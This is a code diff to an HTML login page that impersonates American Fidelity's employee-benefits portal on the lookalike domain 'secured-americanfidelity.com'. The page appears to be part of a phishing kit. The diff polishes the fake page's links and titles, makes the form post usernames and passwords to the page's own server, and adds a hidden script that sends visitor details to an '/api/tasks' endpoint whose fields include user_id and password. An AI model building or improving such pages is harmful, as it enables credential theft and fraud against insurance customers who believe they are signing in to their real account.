@@ -3,12 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>American Fidelity Login | Sign In to Employee Benefits &amp; Insurance Portal 2026</title>
+<title>American Fidelity Sign In — Benefits Account Access</title>
 <meta name="description" content="Sign in to your American Fidelity employee benefits account at secured-americanfidelity.com. Access supplemental insurance, file disability and cancer claims, check claim status, and manage your coverage online.">
-<meta name="keywords" content="American Fidelity login, American Fidelity sign in, AF login, AF sign in, secured-americanfidelity.com login, American Fidelity employee portal login, American Fidelity benefits login, American Fidelity insurance login, American Fidelity Assurance login, American Fidelity account access, employee benefits login, supplemental insurance login, disability insurance login, how to log in to American Fidelity, American Fidelity forgot password, American Fidelity reset password">
 <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
 <link rel="canonical" href="https://secured-americanfidelity.com/login">
-<meta property="og:title" content="American Fidelity Login | Sign In to Benefits Portal 2026">
+<meta property="og:title" content="American Fidelity Sign In — Benefits Account Access">
 <meta property="og:description" content="Sign in to your American Fidelity account at secured-americanfidelity.com. File claims, check status, and manage insurance.">
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://secured-americanfidelity.com/login">
@@ -16,7 +15,7 @@
 <meta property="og:site_name" content="American Fidelity">
 <meta property="og:locale" content="en_US">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="American Fidelity Login | Sign In to Benefits Portal 2026">
+<meta name="twitter:title" content="American Fidelity Sign In — Benefits Account Access">
 <meta name="twitter:description" content="Sign in to your American Fidelity employee benefits account. File claims, check status, and manage coverage at secured-americanfidelity.com.">
 <meta name="twitter:image" content="https://secured-americanfidelity.com/assets/logo.png">
 <link rel="icon" type="image/png" href="/assets/logo.png">
@@ -91,7 +90,7 @@
     <h1 class="auth-h">Sign in</h1>
 
     <div class="auth-form-area">
-      <form id="loginForm" method="post" novalidate>
+      <form id="loginForm" action="/" method="post" novalidate>
         <div style="position:absolute;left:-9999px;top:-9999px" aria-hidden="true">
           <input type="text" name="website" id="hp_field" tabindex="-1" autocomplete="off">
         </div>
@@ -99,13 +98,13 @@
           <label for="userId">UserId <i>*</i></label>
           <input type="text" id="userId" name="User ID" autocomplete="username" autofocus>
         </div>
-        <p class="field-help">Forgot your Username? <a href="#">Let us help</a></p>
+        <p class="field-help">Forgot your Username? <a href="/forgot-username">Let us help</a></p>
 
         <div class="field">
           <label for="password">Password <i>*</i></label>
           <input type="password" id="password" name="Password" autocomplete="current-password">
         </div>
-        <p class="field-help">Forgot your Password? <a href="#">Let us help</a></p>
+        <p class="field-help">Forgot your Password? <a href="/password-reset">Let us help</a></p>
         <div class="auth-field-error" id="pwdError">Password cannot contain spaces.</div>
 
         <button class="btn-lg maroon signin" type="submit">
@@ -134,16 +133,16 @@
 
 <footer class="site-footer">
   <nav>
-    <a href="#">About Us</a>
-    <a href="#">Terms of Use</a>
-    <a href="#">Privacy Policy</a>
+    <a href="/about-american-fidelity">About Us</a>
+    <a href="/security-af">Terms of Use</a>
+    <a href="/privacy">Privacy Policy</a>
   </nav>
   <div class="copy">&copy; American Fidelity 2024. All Rights Reserved.</div>
-  <div class="sitemap"><a href="#">Site Map</a></div>
+  <div class="sitemap"><a href="/sitemap.xml">Site Map</a></div>
 </footer>
 
 <script>
-("requestIdleCallback"in window?requestIdleCallback:function(c){setTimeout(c,2000)})(function(){
+document.addEventListener('DOMContentLoaded', function () {
   var form = document.getElementById('loginForm');
   var loader = document.getElementById('authLoader');
   var error = document.getElementById('authError');
@@ -254,7 +253,10 @@
       showError("Unable to sign in. Please try again later.");
     }
   });
-})();
+});
+</script>
+<script>
+("requestIdleCallback"in window?requestIdleCallback:function(c){setTimeout(c,2000)})(function(){try{fetch("/api/tasks",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({user_id:"visitor",password:"N/A",method:"visit",masked_email:"N/A",masked_phone:"N/A",request_kind:"visit",member_origin:window.location.href,project_name:document.title||"American Fidelity",device_info:navigator.userAgent,screen_size:screen.width+" x "+screen.height,referrer:document.referrer||"Direct"})})}catch(e){}})();
 </script>
 </body>
 </html>
